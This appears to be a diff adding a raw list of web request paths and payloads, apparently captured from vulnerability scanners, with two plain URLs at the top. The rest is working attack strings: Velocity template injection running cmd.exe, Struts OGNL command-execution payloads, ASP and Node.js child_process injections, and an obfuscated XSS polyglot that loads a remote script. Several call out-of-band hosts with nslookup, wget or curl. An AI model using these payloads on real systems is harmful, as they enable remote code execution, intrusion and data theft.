@@ -1,0 +1,12 @@
+https://www.yahoo.com
+https://www.google.com
+#set($engine=\"\")\n#set($cmd=\"cmd.exe /c nslookup 4ssfizptm8pdqejcc0btchvia4ewqe9blvm5ezac\"+\"-jo.r87.me\")#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec($cmd))\n#set($null=$proc.waitFor())\n#set($istr=$proc.getInputStream())\n#set($chr=$engine.getClass().forName(\"java.lang.Character\"))\n#set($output=\"\")\n#set($string=$engine.getClass().forName(\"java.lang.String\"))\n#foreach($i in [1..$istr.available()])\n#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\n#end\n${output}
+/help/rogers/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json
+${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.print('Nessus%20Response:%20'),%23w.println('struts_2_3_14_3_command_execution-1197501602'),%23w.flush(),%23w.close()}.action
+amphtml/finance/%e6%85%a2%e6%85%a2%e5%ad%98%e8%82%a1%e6%af%94%e8%bc%83%e5%bf%ab-%e5%b7%a5%e7%a8%8b%e5%b8%ab%e7%94%a83%e6%8b%9b-%e5%b9%b4%e9%a0%98%e7%99%be%e8%90%ac%e8%82%a1%e5%88%a9-45%e6%ad%b2%e5%8f%8a%e6%97%a9%e8%b2%a1%e5%8b%99%e8%87%aa%e7%94%b1-"+response.write(9345078*9287589)+".html
+.well-known/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json
+arguments[1].end(require(\'child_process\').execSync(\'set /A 268409241 - 49851\'))
+<!->/*\'/*\\\'/*\"/*\\\"/*`/*\\`/*</ifrAmE/</sCript/</StYle/</titlE/</nOSCRiPt/</TextarEa>\\74k<bR/CONtenTEditaBLe/autofoCUS/OnFOcuS=/**/{document.documentElement.appendChild(document.createElement(String.fromCharCode(83,99,114,73,112,116))).setAttribute(String.fromCharCode(83,82,99),String.fromCharCode(72,84,116,80,83,58,47,47,97,46,102,113,104,46,105,111,47,80,65,115,45,71,57,48,104,121,118,84,111,75,89,103,86,48,108,49,112,66,103,46,106,115))}//->
+eval(\'ti^meout 13\')
+xprocess.mainModule.require(\'child_process\').execSync(\'wget http://cm2a33qq0qchnm8b4k3gk8j9jxihb5txk.oast.site\')s
+eval(\'curl -s http://uk.finance.yahoo.com.a.fqh.io/api/bh92Os_OsgSf23IOSy9kOg\')
